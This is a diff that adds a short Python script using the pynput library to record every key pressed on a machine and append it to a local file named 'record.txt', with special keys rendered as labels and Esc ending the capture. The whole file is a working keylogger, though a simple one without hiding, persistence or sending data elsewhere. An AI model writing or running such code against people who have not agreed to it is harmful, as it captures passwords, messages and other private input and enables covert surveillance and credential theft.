@@ -1,0 +1,51 @@
+from pynput.keyboard import Key, Listener
+
+LOG_FILE = "record.txt"
+
+def write_to_log(key):
+    key_data = str(key)
+    if key_data == 'Key.space':
+        key_data = ' '
+    elif key_data == 'Key.enter':
+        key_data = '\n'
+    elif key_data == 'Key.backspace':
+        key_data = '[BACKSPACE]'
+    elif key_data == 'Key.shift_r' or key_data == 'Key.shift':
+        key_data = '[SHIFT]'
+    elif key_data == 'Key.ctrl_l':
+        key_data = '[CTRL]'
+    elif key_data == 'Key.alt_l':
+        key_data = '[ALT]'
+    elif key_data == 'Key.cmd':
+        key_data = '[COMMAND]'
+    elif key_data == 'Key.delete':
+        key_data = '[DELETE]'
+    elif key_data == 'Key.tab':
+        key_data = '[TAB]'
+    elif key_data == 'Key.caps_lock':
+        key_data = '[CAPSLOCK]'
+    elif key_data == 'Key.left':
+        key_data = '[LEFT ARROW]'
+    elif key_data == 'Key.right':
+        key_data = '[RIGHT ARROW]'
+    elif key_data == 'Key.up':
+        key_data = '[UP ARROW]'
+    elif key_data == 'Key.down':
+        key_data = '[DOWN ARROW]'
+    with open(LOG_FILE, 'a') as f:
+        f.write(key_data)
+
+def on_press(key):
+    write_to_log(key)
+
+def on_release(key):
+    if key == Key.esc:
+        # Stop the listener
+        return False
+
+def main():
+    with Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
+
+if __name__ == "__main__":
+    main()
